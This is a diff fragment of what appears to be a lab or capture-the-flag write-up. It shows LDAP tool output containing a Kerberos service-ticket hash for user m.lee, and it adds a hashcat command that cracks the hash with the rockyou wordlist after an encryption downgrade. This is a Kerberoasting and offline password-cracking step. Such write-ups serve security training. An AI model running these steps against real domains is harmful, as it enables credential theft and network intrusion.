@@ -562,5 +562,8 @@ LDAP        10.0.0.100      389    DC               $krb5tgs$23$*m.lee$NOVAFORGE
 Now ill re run the command to get the new hash with the downgraded algorithm
 
 ```python
+hashcat mlee.hash /usr/share/wordlists/rockyou.txt
+
+
 ```
 
